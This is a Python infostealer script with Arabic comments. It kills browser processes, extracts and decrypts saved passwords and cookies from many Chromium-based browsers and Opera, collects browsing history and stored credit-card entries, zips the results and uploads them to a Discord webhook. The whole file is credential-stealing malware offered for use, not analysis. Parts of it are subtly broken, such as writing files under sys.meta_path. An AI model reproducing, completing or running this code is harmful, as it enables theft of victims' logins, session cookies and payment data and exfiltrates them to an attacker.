import base64
import json
import os
import random
import sqlite3
from sys import meta_path
import threading
from Cryptodome.Cipher import AES
import shutil
import requests
import psutil
import zipfile
from win32crypt import CryptUnprotectData


# Function to kill browser processes
def kill_browsers():
    browser_processes = [
        "chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "safari.exe",
        "brave.exe", "vivaldi.exe", "yandex.exe", "edge.exe", "internet explorer.exe",
        "kometa.exe", "orbitum.exe", "cent-browser.exe", "7star.exe", "sputnik.exe",
        "epic-privacy-browser.exe", "uran.exe", "iridium.exe"
    ]
    
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            if proc.info['name'].lower() in browser_processes:
                proc.kill()
                print(f"Killed {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

# Call the function to kill browsers
kill_browsers()


class Browsers:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url  # ضع رابط الويب هوك هنا
        self.sent_files = []  # قائمة لتتبع الملفات التي تم إرسالها
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        temp_path = os.getenv("TEMP")  # إضافة هذا السطر لتعريف temp_path
        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

        self.send_to_webhook("Data extraction started.")

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=self.process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.send_to_webhook("Data extraction completed.")
        
        # After collecting all files, create a zip file and send it
        self.zip_and_send_files()

    def send_to_webhook(self, message):
        payload = {
            "content": message  # استخدم "content" بدلاً من "message" كما هو في Webhook API الخاص بـ Discord
        }
        try:
            response = requests.post(self.webhook_url, json=payload)
            if response.status_code == 200:
                print("Message sent successfully!")
            else:
                print(f"Failed to send message, status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send message: {e}")

    def send_file_to_webhook(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                files = {'file': file}
                response = requests.post(self.webhook_url, files=files)  # إرسال الملف إلى الويب هوك
                if response.status_code == 200:
                    print("File sent successfully!")
                else:
                    print(f"Failed to send file, status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send file: {e}")

    def zip_and_send_files(self):
        # Compress all the collected txt files into a zip file
        temp_path = os.getenv("TEMP")  # تأكد من تعريف temp_path هنا أيضًا
        zip_file_path = os.path.join(temp_path, "Browser_data.zip")
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(os.path.join(temp_path, "Browser")):
                for file in files:
                    if file.endswith(".txt"):  # التأكد من أن الملفات هي من نوع .txt فقط
                        zipf.write(os.path.join(root, file), file)

        # Send the zip file
        self.send_file_to_webhook(zip_file_path)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception:
            pass

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(meta_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        cookies_file_path = os.path.join(meta_path, "Browser", f"{name}_{profile}_cookies.txt")
        if not os.path.exists(cookies_file_path):  # تأكد من عدم تكرار الملف
            with open(cookies_file_path, 'a', encoding="utf-8") as f:
                f.write(f"Browser: {name}     Profile: {profile}\n\n")
                for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.decrypt_password(encrypted_value, self.masterkey)
                    if host_key and name and value != "":
                        f.write(f"{host_key}\t{path}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(meta_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        credit_cards_file_path = os.path.join(meta_path, "Browser", "credit_cards.txt")
        for res in cursor.execute("SELECT name_on_account, credit_card_number FROM credit_cards").fetchall():
            card_holder, card_number = res
            with open(credit_cards_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(credit_cards_file_path) == 0:
                    f.write("Card Holder  |  Card Number\n\n")
                f.write(f"{card_holder}  |  {card_number}\n")
        cursor.close()
        conn.close()


def create_temp():
    temp_path = os.getenv("TEMP")
    return os.path.join(temp_path, "temp.db")

# أدخل رابط الويب هوك الخاص بك هنا
webhook_url = "WEBHOOKS_URL"
browsers = Browsers(webhook_url)
